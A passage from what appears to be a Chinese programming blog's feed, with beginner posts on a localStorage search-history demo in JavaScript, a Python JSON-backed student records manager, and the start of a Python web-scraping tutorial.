class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveHistory</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    mySearch = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;search_content&#x27;</span>).value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> searchs = [];</span><br><span class="line">    <span class="keyword">var</span> storagesearchs = <span class="built_in">JSON</span>.parse(<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;searchs&#x27;</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> storagesearchs)&#123;</span><br><span class="line">        searchs.push(storagesearchs[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (searchs === <span class="literal">undefined</span> || searchs.length == <span class="number">0</span>)&#123;</span><br><span class="line">        searchs.push(mySearch);</span><br><span class="line">        <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;searchs&#x27;</span>,<span class="built_in">JSON</span>.stringify(searchs));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (searchs.length &lt;= <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="comment">//去重</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> searchs)&#123;</span><br><span class="line">                <span class="keyword">if</span>(searchs[i] === mySearch)&#123;</span><br><span class="line">                    flag = <span class="number">0</span>;                        </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(searchs.length == <span class="number">8</span>)&#123;</span><br><span class="line">                    searchs.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">                    searchs.push(mySearch);</span><br><span class="line">                    <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;searchs&#x27;</span>,<span class="built_in">JSON</span>.stringify(searchs));</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    searchs.push(mySearch);</span><br><span class="line">                    <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;searchs&#x27;</span>,<span class="built_in">JSON</span>.stringify(searchs));</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                                </span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">                     </span><br><span class="line">    &#125;</span><br><span class="line">    location.reload();<span class="comment">//函数执行后刷新一次页面</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取出"><a href="#取出" class="headerlink" title="取出"></a>取出</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHistory</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//    alert(&#x27;show&#x27;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> searchs = [];</span><br><span class="line">    <span class="keyword">var</span> storagesearchs = <span class="built_in">JSON</span>.parse(<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;searchs&#x27;</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> storagesearchs)&#123;</span><br><span class="line">        searchs.push(storagesearchs[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> len = searchs.length;</span><br><span class="line">    <span class="keyword">var</span> ul = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;search_list&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);<span class="comment">//创建一个li元素</span></span><br><span class="line">        li.innerHTML = searchs[i];<span class="comment">//将搜索记录写入li中</span></span><br><span class="line">        ul.appendChild(li)<span class="comment">//在ul标签下追加li元素</span></span><br><span class="line">     &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="html代码"><a href="#html代码" class="headerlink" title="html代码"></a>html代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>百度搜索<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://fonts.googleapis.com/css?family=PT+Sans&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/style.css&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;scripts/main.js&quot;</span> <span class="attr">async</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;searching&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span> = <span class="string">&quot;search&quot;</span> <span class="attr">id</span> = <span class="string">&quot;search_content&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索内容·······&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;search_list&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span> <span class="attr">id</span> = <span class="string">&#x27;clicking&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">           </span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次的task1学到了很多东西，localstorage，对js函数也有了更深的认识，还有html，css也学到了很多，开心！！重拾代码乐趣！！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;山山师傅出的第一个小任务，用JavaScript实现web浏览器的本地存储：模拟百度搜索历史记录，将搜索过的内容用本地存储保存并显示出来。这是一篇小白水文。</summary>
    
    
    
    
    <category term="JavaScript" scheme="http://example.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>学生信息管理系统 - python</title>
    <link href="http://example.com/2018/06/30/student-%20manage/"/>
    <id>http://example.com/2018/06/30/student-%20manage/</id>
    <published>2018-06-29T16:00:00.000Z</published>
    <updated>2021-10-25T05:13:36.738Z</updated>
    
    <content type="html"><![CDATA[<p>最近学习python，就写了一个学生管理系统。<span id="more"></span></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>主要功能：</p><ul><li>添加信息</li><li>修改信息</li><li>删除信息</li><li>查找</li><li>显示所有</li></ul><p>数据存取方式：使用json文件存取</p><p>环境：Windows python3</p><p><img src="https://fxxy.oss-cn-shanghai.aliyuncs.com/uPic/image-20211022133851392.png" alt="image-20211022133851392"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">stuinfos = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMenu</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">25</span> + <span class="string">&#x27;1.添加学生信息&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">25</span> + <span class="string">&#x27;2.修改学生信息&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">25</span> + <span class="string">&#x27;3.删除学生信息&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">25</span> + <span class="string">&#x27;4.查找学生信息&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">25</span> + <span class="string">&#x27;5.显示所有学生信息&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">25</span> + <span class="string">&#x27;0.退出系统&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addStuinfo</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">    newName = <span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入学生姓名：&#x27;</span>)</span><br><span class="line">    newSex = <span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入学生性别：&#x27;</span>)</span><br><span class="line">    newPhone = <span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入学生手机号码：&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    stuinfo = &#123;&#125;  <span class="comment">#声明一个字典来存放新学生的信息</span></span><br><span class="line"></span><br><span class="line">    stuinfo[<span class="string">&#x27;name&#x27;</span>] = newName</span><br><span class="line">    stuinfo[<span class="string">&#x27;sex&#x27;</span>] = newSex</span><br><span class="line">    stuinfo[<span class="string">&#x27;phone&#x27;</span>] = newPhone</span><br><span class="line">    <span class="comment">#stuinfos.append(stuinfo)</span></span><br><span class="line"></span><br><span class="line">    save_newData(stuinfo)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyStuinfo</span>():</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入要修改的学生序号：&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    modify_key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入想修改的信息（1.姓名 2.性别 3.手机号码）&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> modify_key == <span class="number">1</span>:</span><br><span class="line">        newName = <span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入修改的姓名：&#x27;</span>)</span><br><span class="line">        stuinfos = load_data()</span><br><span class="line">        stuinfos[number-<span class="number">1</span>][<span class="string">&#x27;name&#x27;</span>] = newName</span><br><span class="line"></span><br><span class="line">        save_Data(stuinfos)</span><br><span class="line">    <span class="keyword">elif</span> modify_key == <span class="number">2</span>:</span><br><span class="line">        newSex = <span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入修改的性别（男/女）：&#x27;</span>)</span><br><span class="line">        stuinfos = load_data()</span><br><span class="line">        stuinfos[number-<span class="number">1</span>][<span class="string">&#x27;sex&#x27;</span>] = newSex</span><br><span class="line">        save_Data(stuinfos)</span><br><span class="line">    <span class="keyword">elif</span> modify_key == <span class="number">3</span>:</span><br><span class="line">        newPhone = <span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入修改的手机号码：&#x27;</span>)</span><br><span class="line">        stuinfos = load_data()</span><br><span class="line">        stuinfos[number-<span class="number">1</span>][<span class="string">&#x27;phone&#x27;</span>] = newPhone</span><br><span class="line">        save_Data(stuinfos)</span><br><span class="line">    <span class="comment">#showStuinfos()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteStuinfos</span>():</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入想要删除的学生序号：&#x27;</span>))</span><br><span class="line">    stuinfos = load_data()</span><br><span class="line">    <span class="keyword">del</span> stuinfos[number-<span class="number">1</span>]</span><br><span class="line">    save_Data(stuinfos)</span><br><span class="line">    showStuinfos()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findStuinfo</span>():</span></span><br><span class="line">    stuinfos = load_data()</span><br><span class="line">    lenth = <span class="built_in">len</span>(stuinfos)</span><br><span class="line">    find_key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;选择查找方式序号（1.序号查找(1-%d) 2.姓名查找）：&#x27;</span>%lenth))</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> find_key == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入想要查找的序号&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> number &gt; lenth:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;Error,the number is big than the total!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;序号         姓名         性别        电话号码&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;%d            %s           %s         %s&#x27;</span>%(number,stuinfos[number-<span class="number">1</span>][<span class="string">&#x27;name&#x27;</span>],stuinfos[number-<span class="number">1</span>][<span class="string">&#x27;sex&#x27;</span>],stuinfos[number-<span class="number">1</span>][<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line"></span><br><span class="line">        find_name = <span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入需要查找的姓名&#x27;</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> stuinfo <span class="keyword">in</span> stuinfos:</span><br><span class="line">            <span class="keyword">if</span> stuinfo[<span class="string">&#x27;name&#x27;</span>] == find_name:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;序号         姓名         性别        电话号码&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;%d            %s           %s         %s&#x27;</span>%(i,stuinfo[<span class="string">&#x27;name&#x27;</span>],stuinfo[<span class="string">&#x27;sex&#x27;</span>],stuinfo[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;Not Found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showStuinfos</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    stuinfos = load_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;序号         姓名         性别        电话号码&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> stuinfo <span class="keyword">in</span> stuinfos:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;%d           %s           %s          %s&#x27;</span>%(i,stuinfo[<span class="string">&#x27;name&#x27;</span>],stuinfo[<span class="string">&#x27;sex&#x27;</span>],stuinfo[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_Data</span>(<span class="params">dicts</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">dict</span> <span class="keyword">in</span> dicts:</span><br><span class="line">            json.dump(<span class="built_in">dict</span>,fw,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">            fw.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        fw.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_newData</span>(<span class="params"><span class="built_in">dict</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.json&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fwr:</span><br><span class="line">        json.dump(<span class="built_in">dict</span>,fwr,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">        fwr.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        fwr.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span>():</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.json&quot;</span>, <span class="string">&quot;r&quot;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fr:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fr:</span><br><span class="line">            dic = json.loads(line)</span><br><span class="line">            data.append(dic)</span><br><span class="line">        fr.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        printMenu()</span><br><span class="line">        key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;  &#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;请输入需要进行的操作：&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">            addStuinfo()</span><br><span class="line">        <span class="keyword">elif</span> key == <span class="number">2</span>:</span><br><span class="line">            modifyStuinfo()</span><br><span class="line">        <span class="keyword">elif</span> key == <span class="number">3</span>:</span><br><span class="line">            deleteStuinfos()</span><br><span class="line">        <span class="keyword">elif</span> key == <span class="number">4</span>:</span><br><span class="line">            findStuinfo()</span><br><span class="line">        <span class="keyword">elif</span> key == <span class="number">5</span>:</span><br><span class="line">            showStuinfos()</span><br><span class="line">        <span class="keyword">elif</span> key == <span class="number">0</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近学习python，就写了一个学生管理系统。</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫-单&amp;多线程</title>
    <link href="http://example.com/2018/05/03/python%E5%8D%95&amp;%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>http://example.com/2018/05/03/python%E5%8D%95&amp;%E5%A4%9A%E7%BA%BF%E7%A8%8B/</id>
    <published>2018-05-02T16:00:00.000Z</published>
    <updated>2021-10-25T05:13:00.907Z</updated>
    
    <content type="html"><![CDATA[<ul><li>以抓取<a href="https://www.pexels.com/%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87%E4%B8%BA%E4%BE%8B">https://www.pexels.com/网站图片为例</a></li><li>前置基础：了解HTML的DOM解析结构</li></ul><span id="more"></span><h2 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h2><h3 id="获取网页html"><a href="#获取网页html" class="headerlink" title="获取网页html"></a>获取网页html</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.pexels.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">page1=request.Request(url,headers=headers)</span><br><span class="line">page=request.urlopen(page1)</span><br><span class="line"></span><br><span class="line">html=page.read()</span><br><span class="line"><span class="built_in">print</span>(html)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.html&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><h3 id="获取图片img标签"><a href="#获取图片img标签" class="headerlink" title="获取图片img标签"></a>获取图片img标签</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 